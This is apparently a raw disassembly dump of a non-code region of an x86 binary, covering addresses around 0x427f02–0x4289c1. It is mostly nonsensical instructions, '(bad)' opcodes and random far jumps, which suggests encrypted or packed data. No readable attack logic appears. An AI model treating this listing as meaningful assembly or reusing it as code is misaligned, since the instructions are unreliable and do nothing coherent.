  427f02:	mov    ch,0x37
  427f04:	adc    ch,ch
  427f06:	leave  
  427f07:	mov    BYTE PTR [ebx],ah
  427f09:	mov    ebp,ebx
  427f0b:	(bad)  
  427f0c:	fild   WORD PTR [ebx+0x53]
  427f0f:	mov    al,0x12
  427f11:	add    eax,0x3cf2c336
  427f16:	iret   
  427f17:	or     ch,al
  427f19:	pop    ebx
  427f1a:	fadd   st,st(6)
  427f1c:	popf   
  427f1d:	mov    ebx,0xec3cd0a7
  427f22:	xor    BYTE PTR [ebx+eiz*8+0x53],dh
  427f26:	pop    esi
  427f27:	test   eax,0x43639599
  427f2c:	out    0x6,eax
  427f2e:	les    edi,FWORD PTR [ebp+0x614fac99]
  427f34:	inc    ebx
  427f35:	dec    edi
  427f36:	icebp  
  427f37:	cld    
  427f38:	push   ebx
  427f39:	retf   0xf998
  427f3c:	or     eax,0x21fa2c90
  427f41:	call   DWORD PTR [edx+0x226f00be]
  427f47:	dec    ecx
  427f48:	jge    0x427f8a
  427f4a:	lods   al,BYTE PTR ds:[esi]
  427f4b:	jge    0x427fa6
  427f4d:	mov    edx,ebx
  427f4f:	xchg   edi,eax
  427f50:	dec    edx
  427f51:	fs call 0x2e75:0x843993e7
  427f59:	dec    ecx
  427f5a:	rol    BYTE PTR [ebx],0xa8
  427f5d:	xchg   ebp,eax
  427f5e:	mov    bh,0xb
  427f61:	jo     0x427f2d
  427f63:	sub    DWORD PTR [esi+esi*2-0x31],esp
  427f67:	inc    eax
  427f68:	aas    
  427f69:	pop    ecx
  427f6a:	sbb    eax,DWORD PTR [edi-0x21]
  427f6d:	push   eax
  427f6e:	inc    ebx
  427f6f:	cmp    DWORD PTR [ebp+0x74],ecx
  427f72:	sub    BYTE PTR [edx-0x44f3eb9a],ah
  427f78:	and    DWORD PTR [eax],ebp
  427f7a:	or     edx,DWORD PTR [edi+0x7d33fb31]
  427f80:	pop    esp
  427f81:	xor    bh,0xc9
  427f84:	jns    0x427f85
  427f86:	and    DWORD PTR [eax-0x70],eax
  427f89:	scas   al,BYTE PTR es:[edi]
  427f8a:	dec    esp
  427f8b:	and    al,0xd2
  427f8d:	mov    eax,esp
  427f8f:	sub    esi,DWORD PTR [esi+ebp*1+0x60]
  427f93:	mov    al,0xd7
  427f95:	inc    ebx
  427f96:	out    dx,eax
  427f97:	jb     0x427f7b
  427f99:	sbb    edx,DWORD PTR [ecx+0x70]
  427f9c:	not    BYTE PTR [eax+0x41]
  427f9f:	mov    ecx,0xb323f95e
  427fa4:	mov    bl,0x7
  427fa6:	loop   0x427f69
  427fa8:	jmp    0xd8a270f5
  427fad:	nop
  427fae:	mov    ch,0xcc
  427fb0:	xor    cl,BYTE PTR [ebx]
  427fb2:	sbb    cl,BYTE PTR [ebp-0x743275b9]
  427fb8:	sar    BYTE PTR [esi+0xb4508ff],0x91
  427fbf:	sbb    eax,0x3d41a2d1
  427fc4:	xrelease xchg DWORD PTR [ebx-0x1e],ebp
  427fc8:	mov    ds:0x674b45ff,eax
  427fcd:	outs   dx,DWORD PTR ds:[esi]
  427fce:	or     DWORD PTR [edx+0x80eed5e],esp
  427fd4:	(bad)  
  427fd6:	neg    edx
  427fd8:	scas   al,BYTE PTR es:[edi]
  427fd9:	lea    ebx,[esi+0x2a19bf44]
  427fdf:	aam    0x96
  427fe1:	les    ebx,FWORD PTR [ebx-0x46bab5a2]
  427fe7:	mov    dh,0x77
  427fe9:	pushf  
  427fea:	repnz shl DWORD PTR [ecx+0x74],1
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	shl    DWORD PTR [edx],0xd3
  428065:	out    dx,al
  428066:	lods   eax,DWORD PTR ds:[si]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	repz je 0x4280eb
  428071:	dec    eax
  428072:	mov    dl,0x63
  428074:	(bad)  
  428075:	xor    bh,BYTE PTR [eax-0x62]
  428078:	adc    al,0x57
  42807a:	xchg   ebp,eax
  42807b:	push   eax
  42807c:	loope  0x428000
  42807e:	idiv   ah
  428080:	pop    esi
  428081:	test   eax,0x20bce361
  428086:	xor    edi,DWORD PTR [ecx]
  428088:	inc    edx
  428089:	out    dx,al
  42808a:	mov    dh,BYTE PTR [ebx+0x7e]
  42808d:	jbe    0x428068
  42808f:	call   0xadde:0x48502369
  428096:	xor    DWORD PTR [ebx],edx
  428098:	sbb    esp,DWORD PTR [edx+ebx*2-0x72d79528]
  42809f:	inc    esi
  4280a0:	test   BYTE PTR [esi],ah
  4280a2:	repnz nop
  4280a4:	lods   al,BYTE PTR ds:[esi]
  4280a5:	icebp  
  4280a6:	pop    DWORD PTR [esi-0x3fb62e24]
  4280ac:	ins    DWORD PTR es:[edi],dx
  4280ad:	cld    
  4280ae:	jne    0x42808c
  4280b0:	ds sti 
  4280b2:	inc    BYTE PTR [ebp+0x652a2976]
  4280b8:	mov    ebx,0x6dd575d2
  4280bd:	mov    ah,0x69
  4280bf:	xchg   edi,eax
  4280c0:	mul    DWORD PTR [edx-0x1ef4aff3]
  4280c6:	adc    DWORD PTR [ecx],edx
  4280c8:	xchg   ebx,eax
  4280c9:	push   0x5e05c0d0
  4280ce:	push   0x6cfe174
  4280d3:	adc    DWORD PTR [ecx],0x13d40cb2
  4280d9:	jne    0x4280ec
  4280db:	lock sub esi,DWORD PTR [eax]
  4280de:	mov    bl,0x45
  4280e0:	xor    eax,DWORD PTR [ecx-0x33a4dab2]
  4280e6:	test   DWORD PTR [edx],edi
  4280e8:	ss sbb eax,0x100fa6e1
  4280ee:	data16 jae 0x428165
  4280f1:	dec    ecx
  4280f2:	jg     0x428139
  4280f4:	xor    eax,0xe89c5837
  4280f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280fa:	xlat   BYTE PTR ds:[ebx]
  4280fb:	dec    ebp
  4280fc:	sbb    esp,DWORD PTR [edx-0x14]
  4280ff:	or     al,0xfc
  428101:	add    BYTE PTR [edi+eiz*2-0x1d],bl
  428105:	dec    ecx
  428106:	adc    eax,0x8484d634
  42810b:	adc    DWORD PTR [esi],ebp
  42810d:	pop    edx
  42810e:	cmp    al,0x4
  428110:	sar    BYTE PTR [ebx-0x1d34a5d1],cl
  428116:	push   ss
  428117:	and    edx,DWORD PTR [ebx+0xee146af]
  42811d:	out    dx,al
  42811e:	push   ebx
  42811f:	(bad)  
  428120:	push   ss
  428121:	push   cs
  428122:	outs   dx,DWORD PTR ds:[esi]
  428123:	adc    al,0x7c
  428125:	lds    ebp,FWORD PTR [ebx]
  428127:	clc    
  428128:	jne    0x428152
  42812a:	xor    BYTE PTR [esi-0x7d],dl
  42812d:	cvtps2pi mm0,QWORD PTR [edx]
  428130:	jbe    0x4280d2
  428132:	std    
  428133:	std    
  428134:	push   ecx
  428135:	mov    ah,0x65
  428137:	(bad)  
  428138:	push   ds
  428139:	(bad)  
  42813a:	retf   0xd50d
  42813d:	cmp    DWORD PTR [eax+ebx*1-0x4cca0fde],ebp
  428144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428145:	iret   
  428146:	push   ecx
  428147:	gs pop esi
  428149:	stos   BYTE PTR es:[edi],al
  42814a:	rcl    esp,1
  42814c:	jo     0x42814b
  42814e:	mov    ah,0xee
  428150:	jne    0x428174
  428152:	lgs    edx,FWORD PTR [edi+0xf]
  428156:	sub    eax,0x2a2dff8a
  42815b:	dec    ebx
  42815c:	addr16 pushf 
  42815e:	daa    
  42815f:	ss aad 0x9a
  428162:	inc    ebp
  428163:	cmp    al,0xc3
  428165:	leave  
  428166:	rol    BYTE PTR [edx-0x3c6c90c5],1
  42816c:	lock sub eax,DWORD PTR [eax]
	...
  4281d3:	add    BYTE PTR [eax],al
  4281d5:	add    bh,bl
  4281d7:	out    dx,al
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	fadd   st,st(3)
  4281e4:	sub    DWORD PTR [ebx],0x1ae67
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	or     eax,0xa15edfb5
  4281f3:	pmaxsw mm2,mm7
  4281f6:	jle    0x428230
  4281f8:	outs   dx,BYTE PTR ds:[esi]
  4281f9:	fdiv   st,st(4)
  4281fb:	sbb    edx,ecx
  4281fd:	mov    DWORD PTR [eax+0x79],ebx
  428200:	iret   
  428201:	sub    BYTE PTR [ebp-0x602ed76b],cl
  428207:	cwde   
  428208:	or     BYTE PTR [ecx+0x5737ae1c],0xa
  42820f:	push   ecx
  428210:	push   eax
  428211:	jp     0x4281da
  428213:	and    eax,0x8ef7bfc5
  428218:	icebp  
  428219:	xor    edi,DWORD PTR [ebx-0x30]
  42821c:	rol    BYTE PTR [eax+0x45],cl
  42821f:	enter  0x31d9,0xa5
  428223:	mov    ecx,0x34879cce
  428228:	das    
  428229:	imul   esi,DWORD PTR [eax+eax*1-0x53],0xe62e94c8
  428231:	pop    ds
  428232:	mov    ebp,0xe18271f
  428237:	push   ebp
  428238:	jmp    0x12c1:0x8e3759cf
  42823f:	call   0x4bbc:0x4b14755b
  428246:	adc    cl,dh
  428248:	mov    bl,0xc3
  42824a:	cmp    DWORD PTR ds:[esi],eax
  42824d:	cvtps2pd xmm4,QWORD PTR [eax+0x7c]
  428251:	ret    0x735c
  428254:	mov    edi,DWORD PTR [eax+0x6b3a39a]
  42825a:	pop    ds
  42825b:	cmp    DWORD PTR [ebp-0x5d9d8b62],edi
  428261:	mov    ebp,0xaca286ba
  428266:	(bad)  
  428267:	cdq    
  428268:	xchg   esp,esi
  42826a:	push   cs
  42826b:	(bad)  
  42826c:	or     BYTE PTR [ebp-0x6d],al
  42826f:	ret    
  428270:	sub    ebx,ebx
  428272:	and    bl,BYTE PTR [edi+0x2a]
  428275:	dec    esi
  428276:	and    al,0x8e
  428278:	mov    ebp,0x25df8b4c
  42827d:	sbb    BYTE PTR [ebp+0x55f6e98b],0x4a
  428284:	xchg   ecx,eax
  428285:	mov    ds:0x7dc1b45d,al
  42828a:	sub    edi,DWORD PTR [esi-0x6e229103]
  428290:	or     BYTE PTR [ebp-0x28e1455e],bh
  428296:	shl    DWORD PTR [edi],cl
  428298:	and    ecx,DWORD PTR [eax+esi*4+0x65]
  42829c:	sub    al,0x83
  42829e:	mov    edi,0x30c37965
  4282a3:	xchg   ecx,eax
  4282a4:	(bad)  
  4282a5:	pop    DWORD PTR [edx+ebx*8-0x494a616b]
  4282ac:	adc    DWORD PTR [eax],esi
  4282ae:	pop    ss
  4282af:	retf   0x3e15
  4282b2:	mov    esp,0xaa42e7c2
  4282b7:	retf   0x8982
  4282ba:	pushf  
  4282bb:	xchg   ebx,eax
  4282bc:	sub    BYTE PTR [ecx+0x22b0b938],dh
  4282c2:	mov    eax,ds:0x8757ca1c
  4282c7:	mov    ebp,0x56cfd2b9
  4282cc:	push   eax
  4282cd:	and    al,0x14
  4282cf:	sub    al,0x5e
  4282d1:	repnz sbb dh,dl
  4282d4:	(bad)  [edi+0x10671fa3]
  4282da:	pop    esp
  4282db:	sub    esi,DWORD PTR [eax]
  4282dd:	loopne 0x4282ff
  4282df:	cld    
  4282e0:	cwde   
  4282e1:	sbb    eax,0x956efb61
  4282e6:	ja     0x4282ff
  4282e8:	push   ebp
  4282e9:	or     al,0xa9
  4282eb:	cmp    DWORD PTR [ebp+0x6a],0x0
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	ins    DWORD PTR es:[edi],dx
  428363:	stos   BYTE PTR es:[edi],al
  428364:	fdivr  QWORD PTR [ecx+0x1af67]
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	pop    eax
  42836f:	xor    bh,0x3b
  428372:	inc    ecx
  428373:	stc    
  428374:	or     bl,dh
  428376:	(bad)  
  428377:	cmp    DWORD PTR [eax],ecx
  428379:	shr    BYTE PTR [ebx+0x2188f58f],cl
  42837f:	jnp    0x4283da
  428381:	clc    
  428382:	jb     0x4283a8
  428384:	inc    edx
  428385:	arpl   bp,cx
  428387:	or     DWORD PTR [edi+ebp*4],edi
  42838a:	in     al,0xfc
  42838c:	jae    0x4283dd
  42838e:	ds pop eax
  428390:	aad    0xb
  428392:	xor    eax,0xe39d49ea
  428397:	sbb    al,BYTE PTR [ebx]
  428399:	cmp    al,0x5d
  42839b:	sti    
  42839c:	mov    esp,0xf693226e
  4283a1:	and    eax,0x42127fa6
  4283a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283a7:	dec    ecx
  4283a8:	and    BYTE PTR [edx+0xc9ca8be],cl
  4283ae:	into   
  4283af:	nop
  4283b0:	add    dh,BYTE PTR [ecx]
  4283b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283b3:	sbb    esp,DWORD PTR [edi-0x80]
  4283b6:	sub    ebx,DWORD PTR [ebx+0x72]
  4283b9:	and    eax,0x7697827e
  4283be:	(bad)  
  4283c0:	push   cs
  4283c1:	out    dx,al
  4283c2:	loopne 0x428418
  4283c4:	cld    
  4283c5:	retf   0xd1d4
  4283c8:	cmp    DWORD PTR [edi-0x60],eax
  4283cb:	or     ebx,DWORD PTR [eax+0x66]
  4283ce:	sti    
  4283cf:	gs push 0x3bf99cf2
  4283d5:	cmp    al,0x4f
  4283d7:	out    0x4b,al
  4283d9:	xchg   DWORD PTR [eax],esi
  4283db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283dc:	xor    bh,dl
  4283de:	push   edx
  4283df:	jo     0x428398
  4283e1:	rcl    BYTE PTR [ebx-0x29e5794f],cl
  4283e7:	rol    DWORD PTR [edi],0x2b
  4283ea:	cmp    ch,bh
  4283ec:	mov    BYTE PTR [ecx-0x6a],dh
  4283ef:	popf   
  4283f0:	rcr    DWORD PTR [eax-0x5053c7e0],1
  4283f6:	(bad)  
  4283f7:	into   
  4283f8:	sub    al,0x3a
  4283fa:	xlat   BYTE PTR ds:[ebx]
  4283fb:	inc    edi
  4283fc:	imul   edx,DWORD PTR [edx],0xa21b1558
  428402:	push   cs
  428403:	sub    al,0xb5
  428405:	inc    ebx
  428406:	cmp    BYTE PTR [ecx-0xfd00785],dl
  42840c:	jmp    0x428408
  42840e:	adc    ebp,DWORD PTR [esi-0x1a2ac814]
  428414:	popa   
  428415:	je     0x42847a
  428417:	jno    0x428450
  428419:	inc    ecx
  42841a:	adc    ebx,ebp
  42841c:	popa   
  42841d:	repz std 
  42841f:	hlt    
  428420:	dec    ebp
  428421:	(bad)  
  428423:	ds dec edi
  428425:	mov    ebx,0x8f00a1b
  42842a:	or     esi,DWORD PTR [ebp+0x7f]
  42842d:	call   0xf27cb7bd
  428432:	inc    ebx
  428433:	xor    ebp,DWORD PTR [edx]
  428435:	mov    ds:0xf6b4b372,eax
  42843a:	vmptrst QWORD PTR [ecx+0x34c0c2a4]
  428441:	mov    esp,0xc77541c9
  428446:	mov    esp,0x9ff096ad
  42844b:	in     eax,0xc3
  42844d:	jmp    0x96086fc1
  428452:	lahf   
  428453:	fndisi(8087 only) 
  428455:	pop    esi
  428456:	jne    0x42844a
  428458:	inc    esi
  428459:	inc    ecx
  42845a:	ins    DWORD PTR es:[edi],dx
  42845b:	popa   
  42845c:	xor    eax,DWORD PTR [eax+esi*8+0x90ba8de]
  428463:	inc    edi
  428464:	adc    BYTE PTR [edx+eiz*8-0x72],dl
  428468:	push   ss
  428469:	and    BYTE PTR [edi+0x2227ab],dh
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xa9abfb32
  4284e3:	aas    
  4284e4:	int3   
  4284e5:	das    
  4284e6:	addr16 mov al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    BYTE PTR [ebx],bl
  4284ef:	push   es
  4284f0:	mov    eax,0x45c2c28d
  4284f5:	inc    esi
  4284f6:	mul    DWORD PTR [eax-0x5f206f9d]
  4284fc:	pop    ebp
  4284fd:	nop
  4284fe:	jle    0x428495
  428500:	push   ss
  428501:	adc    eax,0x752a78ef
  428506:	inc    edx
  428507:	mov    dl,0x32
  428509:	mov    DWORD PTR [esi],esi
  42850b:	(bad)  
  42850c:	pusha  
  42850d:	pop    edi
  42850e:	adc    DWORD PTR ds:0xb774047a,eax
  428514:	mov    al,0x74
  428516:	(bad)  
  428517:	xchg   esi,eax
  428518:	dec    esp
  428519:	sub    al,0xfb
  42851b:	xchg   BYTE PTR [edx+ebx*8],bl
  42851e:	push   ebp
  42851f:	jle    0x428526
  428521:	das    
  428522:	daa    
  428523:	pop    ss
  428524:	aas    
  428525:	xor    esi,DWORD PTR [eax]
  428527:	xchg   DWORD PTR [eax+0x7019d68c],ecx
  42852d:	ins    BYTE PTR es:[edi],dx
  42852e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42852f:	pop    ss
  428530:	push   ebx
  428531:	xchg   esi,eax
  428532:	sar    DWORD PTR [ebp-0x28],0x1c
  428536:	loop   0x4284fe
  428538:	rol    BYTE PTR [ebp-0x765e4d49],cl
  42853e:	pushf  
  42853f:	je     0x42857b
  428541:	pop    ecx
  428542:	loope  0x428572
  428544:	jbe    0x428523
  428546:	push   ss
  428547:	fimul  DWORD PTR ds:0x44c45ff6
  42854d:	sbb    ebx,DWORD PTR [edi]
  42854f:	cmp    al,0xe1
  428551:	retf   0x5b4a
  428554:	cwde   
  428555:	inc    edi
  428556:	nop
  428557:	jb     0x428592
  428559:	lods   eax,DWORD PTR ds:[esi]
  42855a:	adc    bh,BYTE PTR [edi]
  42855c:	xchg   edx,eax
  42855d:	jp     0x428563
  42855f:	adc    BYTE PTR [edi+0x6c],0x44
  428563:	xchg   ebp,eax
  428564:	test   DWORD PTR [edi+edx*1-0x69f58daf],esi
  42856b:	mov    edx,0x9e777520
  428570:	addr16 push esp
  428572:	push   DWORD PTR [esi+0x7e]
  428575:	(bad)  
  428576:	xor    bh,bh
  428578:	lock mov dl,0xdc
  42857b:	aaa    
  42857c:	ror    eax,cl
  42857e:	or     edx,DWORD PTR [ecx+0x7]
  428581:	cmp    cl,BYTE PTR [edx+0x44f7caaf]
  428587:	clc    
  428588:	push   0xfffffff9
  42858a:	xor    dl,ah
  42858c:	pushf  
  42858d:	push   ebp
  42858e:	ds cs cmc 
  428591:	xlat   BYTE PTR ds:[ebx]
  428592:	xchg   DWORD PTR [ecx+0x5142e8a1],ebx
  428598:	and    esp,eax
  42859a:	popa   
  42859b:	pop    ss
  42859c:	sub    eax,0xc3e9894c
  4285a1:	mul    DWORD PTR [edi+0x15a641ad]
  4285a7:	in     eax,0x8f
  4285a9:	fadd   QWORD PTR [esi+0x46]
  4285ac:	repz gs and eax,0x93e00658
  4285b3:	int3   
  4285b4:	mov    ?,WORD PTR [eax]
  4285b6:	leave  
  4285b7:	(bad)  
  4285b8:	retf   0xbb55
  4285bb:	sahf   
  4285bc:	cmp    dl,BYTE PTR [esi-0x28e25779]
  4285c2:	xor    DWORD PTR [esi-0x20],ebx
  4285c5:	test   DWORD PTR [edx-0x2b91b2f3],esi
  4285cb:	xor    DWORD PTR [edx+0x72],edx
  4285ce:	ret    0xf1f0
  4285d1:	push   esi
  4285d2:	test   BYTE PTR [edi],ah
  4285d4:	mov    ebx,0x5512c8a9
  4285d9:	aaa    
  4285da:	or     DWORD PTR [edx+eiz*1],0xffffffbb
  4285de:	sbb    eax,0x8ecd11d6
  4285e3:	fcomp  DWORD PTR [edi]
  4285e5:	les    esp,FWORD PTR [ebp+eax*8-0x48df6ce]
  4285ec:	mov    esp,0x3f
	...
  428655:	add    BYTE PTR [ecx-0xa],dl
  428658:	xor    eax,0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0xf371a3f6
  428664:	pop    ds
  428665:	inc    edx
  428666:	addr16 mov cl,0x1
  428669:	add    BYTE PTR [eax],al
  42866b:	add    DWORD PTR [eax],eax
  42866d:	add    BYTE PTR [ebx-0x2a],ah
  428670:	repnz xor al,0x85
  428673:	xchg   bh,dh
  428675:	jmp    DWORD PTR [eax+0x3a]
  428678:	dec    edi
  428679:	push   esp
  42867a:	mov    ch,0xbc
  42867c:	sbb    ah,bh
  42867e:	and    al,0xbb
  428680:	mov    ebx,0x8c28b957
  428685:	inc    edi
  428686:	scas   al,BYTE PTR es:[edi]
  428687:	dec    ebx
  428688:	retf   
  428689:	call   0x6b9e:0x586862b1
  428690:	dec    esp
  428691:	dec    esi
  428692:	sub    eax,0xa6675ef7
  428697:	pop    ecx
  428698:	dec    eax
  428699:	js     0x42869c
  42869b:	lock cmp DWORD PTR [edi],0x8273c322
  4286a2:	or     DWORD PTR [ebp+0x749cff81],esi
  4286a8:	sub    DWORD PTR [eax],0xd2be744a
  4286ae:	mov    ds:0xa8095048,al
  4286b3:	push   0x3ce6ff59
  4286b8:	xor    DWORD PTR [ecx+0x5f677207],0xf91bede6
  4286c2:	dec    ebp
  4286c3:	loop   0x42873e
  4286c5:	mov    eax,ds:0xb457b2a4
  4286ca:	or     eax,0x815ba868
  4286cf:	or     edi,DWORD PTR [esi+0x8]
  4286d2:	sbb    eax,0xa42b4628
  4286d7:	jae    0x428685
  4286d9:	in     eax,0x60
  4286db:	dec    ebx
  4286dc:	fcom   DWORD PTR [ebp-0x2a]
  4286df:	fprem1 
  4286e1:	imul   ebp,ebp,0x50a0f622
  4286e7:	push   ecx
  4286e8:	and    dh,bh
  4286ea:	xor    bl,al
  4286ec:	in     al,dx
  4286ed:	sub    al,0x31
  4286ef:	scas   al,BYTE PTR es:[edi]
  4286f0:	and    ebx,DWORD PTR [ecx-0x64]
  4286f3:	adc    BYTE PTR [eax+0xe],0x36
  4286f7:	cmc    
  4286f8:	sahf   
  4286f9:	mov    ds,eax
  4286fb:	xchg   ecx,eax
  4286fc:	jbe    0x4286da
  4286fe:	in     al,0x17
  428700:	mov    dl,0x5
  428702:	push   esi
  428703:	std    
  428704:	repnz fdiv QWORD PTR ds:0x4e10e01b
  42870b:	cmp    DWORD PTR [ecx+edx*8+0x5c7bd09b],ebx
  428712:	jg     0x42874d
  428714:	mov    ah,0x8a
  428716:	loop   0x42877f
  428718:	xchg   edi,eax
  428719:	popa   
  42871a:	pop    esp
  42871b:	(bad)  
  42871c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42871d:	push   0x5ad033de
  428722:	out    0x98,al
  428724:	mov    ds:0x3689e0c4,al
  428729:	(bad)  
  42872b:	add    dh,0xe6
  42872e:	mov    esp,0x9663842
  428733:	inc    esp
  428734:	xor    eax,0xb0493d9c
  428739:	jg     0x42873c
  42873b:	enter  0x543c,0x40
  42873f:	push   ebp
  428740:	cmc    
  428741:	aam    0x35
  428743:	jle    0x428764
  428745:	mov    edx,0x5f9f79cc
  42874a:	adc    eax,0x6e9311f0
  42874f:	lods   eax,DWORD PTR ss:[esi]
  428751:	lea    edx,[ebp+0xc3bd1ad]
  428757:	sub    BYTE PTR [edi],bh
  428759:	outs   dx,BYTE PTR ds:[esi]
  42875b:	fs jbe 0x428716
  42875e:	pop    eax
  42875f:	xor    esi,DWORD PTR [esi+0x48]
  428762:	xchg   edi,eax
  428763:	adc    bh,ch
  428765:	mov    ds:0xf71c1160,al
  42876a:	sbb    ecx,DWORD PTR [ebp-0x37]
  42876d:	out    dx,al
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x83b2bdf8
  4287e5:	pushf  
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    cl,bl
  4287ef:	nop    DWORD PTR [ebx]
  4287f2:	mov    dh,ah
  4287f4:	push   es
  4287f5:	cmp    ah,BYTE PTR [edi]
  4287f7:	pop    ds
  4287f8:	cmp    DWORD PTR [eax-0x71b10c33],esi
  4287fe:	cs add al,0x90
  428801:	jb     0x4287ef
  428803:	(bad)  
  428804:	sub    BYTE PTR [edi+0x570251c4],ah
  42880a:	adc    al,0x7b
  42880c:	mov    esp,0xc3c6a6ca
  428811:	mov    esi,0x8029d1bf
  428816:	hlt    
  428817:	inc    eax
  428818:	sub    ch,0xc8
  42881b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42881c:	jb     0x428860
  42881e:	lahf   
  42881f:	je     0x428865
  428821:	mov    al,ds:0x5778204a
  428826:	and    BYTE PTR [eax+ebx*8-0x38],dl
  42882a:	mov    ebx,0x4c98c0bf
  42882f:	mov    ch,0x2e
  428831:	add    al,0xc2
  428833:	test   eax,0x76285ceb
  428838:	xlat   BYTE PTR ds:[ebx]
  428839:	push   ebp
  42883a:	push   0xffffff8d
  42883c:	add    ecx,DWORD PTR [edx+eiz*1+0x36]
  428840:	sub    DWORD PTR [eax-0x7e],edx
  428843:	dec    ebx
  428844:	xchg   esp,eax
  428845:	out    dx,al
  428846:	mov    ecx,0xff978747
  42884b:	in     al,0x18
  42884d:	rcl    DWORD PTR [ebp+0x5d],cl
  428850:	push   ecx
  428851:	push   cs
  428852:	out    0x63,eax
  428854:	arpl   WORD PTR [edi],bx
  428856:	sub    cl,BYTE PTR [edx+ebx*4-0x3]
  42885a:	xchg   esp,eax
  42885b:	jmp    0x3c155bf7
  428860:	sub    DWORD PTR [edi+edx*1+0x6e],0xea2e15a4
  428868:	adc    eax,0xe4a0a5e1
  42886d:	fs (bad) 
  42886f:	ficomp WORD PTR [ecx]
  428871:	xor    eax,DWORD PTR [eax+0x19]
  428874:	mov    ebp,0x878ae540
  428879:	or     DWORD PTR [esp+ecx*1+0x32a2e467],ecx
  428880:	daa    
  428881:	inc    edi
  428882:	jnp    0x428881
  428884:	mov    ch,0x6
  428886:	dec    BYTE PTR [edx]
  428888:	jg     0x42886a
  42888a:	pop    edx
  42888b:	sub    BYTE PTR [ecx],dl
  42888d:	jbe    0x4288f5
  42888f:	cli    
  428890:	dec    eax
  428891:	scas   eax,DWORD PTR es:[edi]
  428892:	push   eax
  428893:	inc    esp
  428894:	jl     0x4288dd
  428896:	rol    BYTE PTR [eax+0x4b7b1548],0x62
  42889d:	pop    ebp
  42889e:	rcl    BYTE PTR [esi+0xf],1
  4288a1:	dec    eax
  4288a2:	xor    dl,0x35
  4288a5:	nop
  4288a6:	fadd   DWORD PTR [ecx]
  4288a8:	xchg   ecx,eax
  4288a9:	inc    eax
  4288aa:	test   edx,ebx
  4288ac:	jg     0x4288ad
  4288ae:	mov    esp,0x2742056f
  4288b3:	addr16 cmp al,0x2c
  4288b6:	jecxz  0x4288df
  4288b8:	lods   al,BYTE PTR ds:[esi]
  4288b9:	aas    
  4288ba:	into   
  4288bb:	and    BYTE PTR [ecx-0x3f],cl
  4288be:	sbb    eax,0x3ecdb49a
  4288c3:	add    eax,0xe66ac623
  4288c8:	adc    eax,0x6ccf5cc0
  4288cd:	xchg   edi,eax
  4288ce:	xor    esi,eax
  4288d0:	out    dx,al
  4288d1:	and    ebp,DWORD PTR [edx+0x4cf28260]
  4288d7:	int3   
  4288d8:	gs inc ebp
  4288da:	add    al,0xd9
  4288dc:	gs sub al,0x91
  4288df:	jmp    0x5250:0xf030b947
  4288e6:	jae    0x42886c
  4288e8:	jae    0x4288f3
  4288ea:	push   ds
  4288eb:	popa   
  4288ec:	pop    eax
  4288ed:	add    BYTE PTR ds:[eax],al
	...
  428954:	add    BYTE PTR [eax],al
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0x4d7a9d0f],bx
  428964:	shr    DWORD PTR [edi],0x67
  428967:	mov    bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [edi],bl
  42896f:	dec    eax
  428970:	(bad)  
  428971:	jae    0x4289cc
  428973:	cmp    DWORD PTR [ecx+0x3b0b3e7e],edi
  428979:	mov    edx,0x2f9f9a0f
  42897e:	ins    BYTE PTR es:[edi],dx
  42897f:	sbb    eax,0xa185ecf5
  428984:	jmp    0xe75e:0x612bb171
  42898b:	stos   BYTE PTR es:[edi],al
  42898c:	mov    ebp,0xffa74ec9
  428991:	(bad)  
  428992:	popf   
  428993:	and    edi,DWORD PTR [edi+0x66]
  428996:	popa   
  428997:	adc    BYTE PTR ds:0x2fdb661,0x3e
  42899e:	push   esi
  42899f:	loop   0x42897a
  4289a1:	aam    0xb8
  4289a3:	sahf   
  4289a4:	add    bl,dl
  4289a6:	mov    esp,0x4227c03e
  4289ab:	ja     0x428a12
  4289ad:	imul   ebx,DWORD PTR ds:0xc45489fb,0xffffff8b
  4289b4:	jl     0x428a29
  4289b6:	xor    al,0x71
  4289b8:	mov    eax,DWORD PTR [esi]
  4289ba:	push   ss
  4289bb:	out    dx,eax
  4289bc:	outs   dx,DWORD PTR ds:[esi]
  4289bd:	aaa    
  4289be:	push   esp
  4289bf:	xor    bh,BYTE PTR [ecx]
  4289c1:	xor    esp,DWORD PTR [esp+eiz*4+0x7cd968c6]
